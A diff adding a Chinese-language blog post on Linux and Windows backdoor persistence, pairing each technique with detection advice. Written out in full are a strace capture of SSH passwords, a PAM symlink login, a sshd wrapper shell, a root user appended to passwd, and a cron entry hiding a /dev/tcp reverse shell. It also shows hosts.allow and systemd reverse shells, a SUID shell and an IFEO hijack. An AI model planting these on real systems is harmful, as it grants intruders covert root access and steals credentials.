@@ -1,0 +1,853 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/images/dandan.png">
+  <link rel="icon" href="/images/dandan.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Encounter">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="当拿下一台服务器，为达到长久控制的目的，如何结合系统自身的某些特性，达到持久化控制的效果呢？知其白，守其黑，为天下式，在应急响应的过程中，又该如何尽早地排查出这些后门？">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows&amp;Linux后门技术初探">
+<meta property="og:url" content="https://chujian521.github.io/blog/2023/09/23/Windows-Linux%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%88%9D%E6%8E%A2/index.html">
+<meta property="og:site_name" content="X&#39;s blog">
+<meta property="og:description" content="当拿下一台服务器，为达到长久控制的目的，如何结合系统自身的某些特性，达到持久化控制的效果呢？知其白，守其黑，为天下式，在应急响应的过程中，又该如何尽早地排查出这些后门？">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chujian521.github.io/images/fj68.jpg">
+<meta property="article:published_time" content="2023-09-23T06:11:26.000Z">
+<meta property="article:modified_time" content="2023-10-03T13:59:47.079Z">
+<meta property="article:author" content="Encounter">
+<meta property="article:tag" content="backdoor">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://chujian521.github.io/images/fj68.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Windows&amp;Linux后门技术初探 - X&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"chujian521.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"88d6a072634686f804175a1f3d287260","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?88d6a072634686f804175a1f3d287260";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>X&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Windows&amp;Linux后门技术初探"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-23 14:11" pubdate>
+          2023年9月23日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          76 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Windows&amp;Linux后门技术初探</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>当拿下一台服务器，为达到长久控制的目的，如何结合系统自身的某些特性，达到持久化控制的效果呢？<strong>知其白，守其黑，为天下式</strong>，在应急响应的过程中，又该如何尽早地排查出这些后门？</p>
+<p><img src="/images/fj68.jpg" srcset="/img/loading.gif" lazyload></p>
+<span id="more"></span>
+
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="strace获取登录凭证"><a href="#strace获取登录凭证" class="headerlink" title="strace获取登录凭证"></a>strace获取登录凭证</h3><h4 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h4><p>凭证将会通过strace追踪到系统sshd进程，并将追踪到的信息保存到log文件，这些信息中包含了系统明文密码以及ssh私钥。</p>
+<p>1.查看sshd的进程pid：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ps -ef | grep sshd<br>root        887      1  0 01:04 ?        00:00:00 /usr/sbin/sshd -D<br></code></pre></td></tr></table></figure>
+
+<p>2.strace跟踪进程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo strace -f -p 887 -o /tmp/.ssh.log -e trace=<span class="hljs-built_in">read</span>,write -s 4096<br>strace: Process 887 attached<br></code></pre></td></tr></table></figure>
+
+<p>3.等待相应的用户使用ssh登录，strace捕获到的凭证将会保存在&#x2F;tmp&#x2F;.ssh.log文件下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> .ssh.log | grep <span class="hljs-string">&quot;write(4&quot;</span><br>2049  write(4, <span class="hljs-string">&quot;\0\0\0@\6&quot;</span>, 5)          = 5<br>2049  write(4, <span class="hljs-string">&quot;\0\0\0\1\0\0\0 \5\262\210\334A\260l5\335\224\362\344\347\225;\324\226\215_\235\231\302\37\233\3\257b=\266&#125;\213\340\0\0\0\23ecdsa-sha2-nistp256&quot;</span>, 63) = 63<br>2049  write(4, <span class="hljs-string">&quot;\0\0\0\10\10&quot;</span>, 5)       = 5<br>2049  write(4, <span class="hljs-string">&quot;\0\0\0\1d&quot;</span>, 5)          = 5<br>2049  write(4, <span class="hljs-string">&quot;\0\0\0\33\4&quot;</span>, 5)        = 5<br>2049  write(4, <span class="hljs-string">&quot;\0\0\0\16ssh-connection\0\0\0\0\0\0\0\0&quot;</span>, 26) = 26<br>2049  write(4, <span class="hljs-string">&quot;\0\0\0\v\f&quot;</span>, 5)         = 5<br>2049  write(4, <span class="hljs-string">&quot;\0\0\0\006123456&quot;</span>, 10)  = 10 <span class="hljs-comment">#look here</span><br>2049  write(4, <span class="hljs-string">&quot;\0\0\0\1f&quot;</span>, 5)          = 5<br>2049  write(4, <span class="hljs-string">&quot;\0\0\6\5\32&quot;</span>, 5)        = 5<br><br></code></pre></td></tr></table></figure>
+
+<p>也可以直接把第1、2步骤的命令合并到一条：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo strace -f -p `ps -ef | grep <span class="hljs-string">&quot;sshd -D&quot;</span>|grep -v grep | awk &#123;<span class="hljs-string">&#x27;print $2&#x27;</span>&#125;` -o /tmp/.ssh.log -e trace=<span class="hljs-built_in">read</span>,write -s 4096<br></code></pre></td></tr></table></figure>
+
+<h4 id="检查此类后门"><a href="#检查此类后门" class="headerlink" title="检查此类后门"></a>检查此类后门</h4><p>可以通过ps 等命令查看是否存在strace进程在监控sshd，如果存在及时kill，并将该命令写入的log及时删除</p>
+<h4 id="其他骚操作"><a href="#其他骚操作" class="headerlink" title="其他骚操作"></a>其他骚操作</h4><p>可以在bashrc中给常用命令起别名，运行时自动启用strace抓取口令，针对此类要检查一下bashrc有没有可疑的alias，或者使用alias工具检查有没有可疑的别名，或者创建高权限用户</p>
+<h3 id="SSH软连接后门"><a href="#SSH软连接后门" class="headerlink" title="SSH软连接后门"></a>SSH软连接后门</h3><p>软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中会去PAM配置文件夹中寻找是否存在对应名称的配置信息（su），su在pam_rootok只检测uid 0即认证成功，导致了可以使用任意密码登录。</p>
+<p>直接启动&#x2F;usr&#x2F;sbin&#x2F;sshd,默认使用&#x2F;etc&#x2F;pam.d&#x2F;sshd的pam配置文件，因而不能建立任意密码登录的后门。而通过软链接的方式，实质上PAM认证是通过软链接的文件名（如：&#x2F;usr&#x2F;local&#x2F;su），在&#x2F;etc&#x2F;pam.d&#x2F;目录下寻找对应的PAM配置文件(如：&#x2F;etc&#x2F;pam.d&#x2F;su)。</p>
+<h4 id="留后门-1"><a href="#留后门-1" class="headerlink" title="留后门"></a>留后门</h4><ol>
+<li>sshd服务需要启用PAM认证机制，在&#x2F;etc&#x2F;ssh&#x2F;sshd_config文件中，设置UsePAM 为yes。如果不启用PAM，系统严格验证用户密码，不能建立后门。</li>
+<li>&#x2F;etc&#x2F;pam.d&#x2F;目录下，对应文件里包含”auth sufficient pam_rootok.so”配置，只要PAM配置文件中包含此配置即可SSH任意密码登录</li>
+</ol>
+<p>受害者主机上运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=9999<br></code></pre></td></tr></table></figure>
+
+<p>攻击者主机上运行ssh连接命令指定上述端口即可，输入密码是任意填写即可以root身份登录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh root@x.x.x.x -p 9999<br>root@x.x.x.x<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">Last login: Sat Sep 23 03:40:29 2023 from x.x.x.x</span><br><span class="hljs-string">root@ubuntu:~# exit</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="检测后门"><a href="#检测后门" class="headerlink" title="检测后门"></a>检测后门</h4><p>1.查看系统当前端口状态。</p>
+<p>这类后门会开启监听端口，我们可以先查看&#x2F;etc&#x2F;pam.d&#x2F;目录下有哪些文件包含该配置，然后通过管道符找到异常端口及进程，再通过进程找到异常文件、杀掉进程、关闭PAM认证即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">find /etc/pam.d/ | xargs grep <span class="hljs-string">&quot;pam_rootok.so&quot;</span><br>netstat -antlp |grep -E <span class="hljs-string">&quot;su|chsh|chfn|runuser&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>2.查看系统登录日志</p>
+<p>使用last系列命令检查是否有异常的登录</p>
+<h3 id="SSH公钥免密登录"><a href="#SSH公钥免密登录" class="headerlink" title="SSH公钥免密登录"></a>SSH公钥免密登录</h3><h4 id="留后门-2"><a href="#留后门-2" class="headerlink" title="留后门"></a>留后门</h4><p>将攻击机的公钥写入.ssh&#x2F;authorized_keys文件中，即可利用公钥免密登录靶机</p>
+<h4 id="检测后门-1"><a href="#检测后门-1" class="headerlink" title="检测后门"></a>检测后门</h4><p>检查.ssh&#x2F;authorized_keys文件的变动，检查系统当前登录状态和登录记录</p>
+<h3 id="SSH-Wrapper后门"><a href="#SSH-Wrapper后门" class="headerlink" title="SSH Wrapper后门"></a>SSH Wrapper后门</h3><p>首先启动的是&#x2F;usr&#x2F;sbin&#x2F;sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动&#x2F;usr&#x2F;bin&#x2F;sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的&#x2F;usr&#x2F;sbin&#x2F;sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是13377就执行sh给个shell.</p>
+<p>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断</p>
+<h4 id="留后门-3"><a href="#留后门-3" class="headerlink" title="留后门"></a>留后门</h4><p>靶机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/sbin/<br><span class="hljs-built_in">mv</span> sshd ../bin/    <span class="hljs-comment">#对sshd程序做备份</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/usr/bin/perl&#x27;</span> &gt;sshd<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27;</span> &gt;&gt; sshd <span class="hljs-comment"># 4A对应的是端口号13377，十六进制3441，转ASCII就是4A</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27;</span> &gt;&gt; sshd<br><span class="hljs-built_in">chmod</span> u+x sshd<br>/etc/init.d/ssh restart<br></code></pre></td></tr></table></figure>
+
+<p>攻击机连接：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socat</span> STDIO TCP4:<span class="hljs-number">192.168.52.132:22</span>,sourceport=<span class="hljs-number">13377</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="检测后门-2"><a href="#检测后门-2" class="headerlink" title="检测后门"></a>检测后门</h4><p>检查sshd文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al /usr/sbin/sshd<br><span class="hljs-built_in">cat</span> /usr/sbin/sshd<br></code></pre></td></tr></table></figure>
+
+<p>如果有修改异常，可以选择清除后门重新安装ssh服务</p>
+<h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><h4 id="留后门-4"><a href="#留后门-4" class="headerlink" title="留后门"></a>留后门</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">生成密码： openssl passwd -1 -salt admin 123456 <br>-1 的意思是使用md5crypt加密算法 <br>-salt 指定盐为admin <br>123456 明文密码<br>然后将生成的密码按照规则写入/etc/passwd<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;admin:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd<br></code></pre></td></tr></table></figure>
+
+<h4 id="检测后门-3"><a href="#检测后门-3" class="headerlink" title="检测后门"></a>检测后门</h4><p>检查&#x2F;etc&#x2F;passwd文件中有没有最近修改，有没有可疑的用户</p>
+<h3 id="Cron计划任务"><a href="#Cron计划任务" class="headerlink" title="Cron计划任务"></a>Cron计划任务</h3><h4 id="留后门-5"><a href="#留后门-5" class="headerlink" title="留后门"></a>留后门</h4><p>攻击者将恶意代码或程序隐藏在系统磁盘中，并由计划任务调用时启动它们</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(crontab-l; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;*/1 * * * * /bin/bash/ tmp/1.sh;/bin/bash --noprofile -i&#x27;</span>) | crontab -<br></code></pre></td></tr></table></figure>
+
+<p>这种普通的后门可以用<code>crontab -l</code>轻松检查出来，更高阶一点的是利用cat工具的特性，cat默认支持一些如\r回车符、\n换行符、\f换页符等，也就是这些符号导致的能够隐藏命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(crontab -l; <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;*/1 * * * * bash-i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1; /bin/bash --noprofile -i;\rno crontab for`whoami`%100c\n&quot;</span>) | crontab -<br></code></pre></td></tr></table></figure>
+
+<h4 id="检测后门-4"><a href="#检测后门-4" class="headerlink" title="检测后门"></a>检测后门</h4><ol>
+<li>使用<code>crontab -e</code>检查编辑计划任务</li>
+<li>使用vim等文本编辑工具检查cron计划任务创建的文件</li>
+</ol>
+<h3 id="SUID-Shell后门"><a href="#SUID-Shell后门" class="headerlink" title="SUID Shell后门"></a>SUID Shell后门</h3><p><a href="https://chujian521.github.io/blog/2022/11/19/Linux%E4%B8%AD%E7%9A%84SUID%E3%80%81SGID%E3%80%81SBIT%E6%9D%83%E9%99%90%E4%BB%8B%E7%BB%8D/">SUID权限</a>前面的博客有过介绍，简单来说就是拥有该权限的可执行程序在执行时会以文件拥有者身份执行</p>
+<h4 id="留后门-6"><a href="#留后门-6" class="headerlink" title="留后门"></a>留后门</h4><p>复制bash程序到某个目录，并为其增加root用户的SUID权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /bin/bash /tmp/shell<br><span class="hljs-built_in">chmod</span> u+s /tmp/shell<br></code></pre></td></tr></table></figure>
+
+<p>普通用户执行<code>/tmp/shell -p</code>即可以root权限执行命令（但是此时我们的身份依然是原来的身份，uid没有变，但是有root的权限，euid&#x3D;0）</p>
+<h4 id="检测后门-5"><a href="#检测后门-5" class="headerlink" title="检测后门"></a>检测后门</h4><p>检查SUID设置的文件<code>find . -perm /4000</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -perm /4000<br>./bash<br></code></pre></td></tr></table></figure>
+
+<p>然后删除或者取消SUID权限<code>chmod u-s ./bash</code></p>
+<h3 id="Tcp-wrapper后门"><a href="#Tcp-wrapper后门" class="headerlink" title="Tcp wrapper后门"></a>Tcp wrapper后门</h3><p>TCPWrappers是一个工作在第四层（传输层）的的安全工具，对有状态连接的特定服务进行安全检测并实现访问控制，凡是包含libwrap.so库文件的的程序就可以受TCPWrappers的安全控制。它的主要功能就是控制谁可以访问，常见的程序有rpcbind、vsftpd、sshd，telnet。通过修改配置文件hosts.allow，实现tcpd（Tcp Wrapper的守护进程）每当有ssh等的连接请求时，如若请求满足配置文件中的规则即可触发命令的执行。</p>
+<h4 id="留后门-7"><a href="#留后门-7" class="headerlink" title="留后门"></a>留后门</h4><p>TCP_Wrappers的使用主要是依靠两个配置文件&#x2F;etc&#x2F;hosts.allow, &#x2F;etc&#x2F;hosts.deny，用于拒绝和接受。之所以能够被用作后门是因为他存在一个参数是spawn （spawn启动一个外部程序完成执行的操作）</p>
+<p>我们可以修改allow配置，追加以下规则：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ALL: ALL: spawn (bash -c <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/your_ip/6666 0&gt;&amp;1&quot;</span>) &amp; :allow<br></code></pre></td></tr></table></figure>
+
+<p>然后攻击机监听端口即可：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure>
+
+<p>可以使用ssh尝试连接即可触发</p>
+<h4 id="检测后门-6"><a href="#检测后门-6" class="headerlink" title="检测后门"></a>检测后门</h4><p>检测&#x2F;etc&#x2F;hosts.allow, &#x2F;etc&#x2F;hosts.deny文件中有没有恶意命令执行的规则，如有删除恶意的代码</p>
+<h3 id="Systemd服务后门"><a href="#Systemd服务后门" class="headerlink" title="Systemd服务后门"></a>Systemd服务后门</h3><h4 id="留后门-8"><a href="#留后门-8" class="headerlink" title="留后门"></a>留后门</h4><p>在<code>/etc/systemd/system</code>目录下新建.service文件，并赋予可执行权限，内容如下：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=System bash<br><span class="hljs-attr">After</span>=network.target<br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Type</span>=forking<br><span class="hljs-attr">ExecStart</span>=/home/user/re.sh<br><span class="hljs-attr">ExecReload</span>=<br><span class="hljs-attr">ExecStop</span>=<br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure>
+
+<p>其中<code>/home/user/re.sh</code>的内容为反弹shell命令:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br>/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.20/9999 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+
+<p>启动服务后即可收到反弹shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">netcat -lvp 9999<br>Listening on [0.0.0.0] (family 0, port 9999)<br>Connection from 192.168.1.20 61971 received!<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (3195): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>root@ubuntu:/<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="检查后门"><a href="#检查后门" class="headerlink" title="检查后门"></a>检查后门</h4><p>检查<code>/etc/systemd/system</code>、<code>/usr/lib/systemd/system</code>目录下有没有可疑的服务并删除恶意代码</p>
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h3><p>对于在Windows Vista和Windows Server 2008 及更高的版本中，替换的二进制文件受到了系统的保护，无法使用经典的shift后门（直接替换相应的系统程序为恶意程序）。”映像劫持”，也被称为”IFEO”，Image File Execution Options（其实应该称为”image Hijack”。）是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。由于这个项主要是用来调试程序用的，对一般用户意义不大。默认是只有管理员和local system有权读写修改。</p>
+<h4 id="留后门-9"><a href="#留后门-9" class="headerlink" title="留后门"></a>留后门</h4><p>当目标程序被映像劫持时，当我们启动目标程序时，启动的是劫持后的程序而不是原来的程序。在注册表的<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>目录下新建<code>sethc.exe</code>项目（也可以替换成其他的常用的），然后在该项目下新建字符串键值<code>&quot;debugger&quot;=&quot;C:\\Windows\\System32\\cmd.exe&quot;</code>，路径为恶意程序路径。</p>
+<p>下次用户使用sethc.exe时就会触发恶意程序执行</p>
+<h4 id="检测后门-7"><a href="#检测后门-7" class="headerlink" title="检测后门"></a>检测后门</h4><p>检查<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution </code>注册表项中有没有可疑的debugger键值</p>
+<h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p>DLL劫持指病毒通过一些手段来劫持或者替换正常的DLL，欺骗正常程序加载预先准备好的恶意DLL。</p>
+<p>DLL(动态链接库)作为 windows 的函数库，有助于促进代码的模块化、代码重用、有效的内存使用并减少磁盘空间；一个应用程序运行时可能需要依赖于多个 DLL 的函数才能完成功能，如果控制其中任一 DLL，那么便可以控制该应用程序的执行流程。</p>
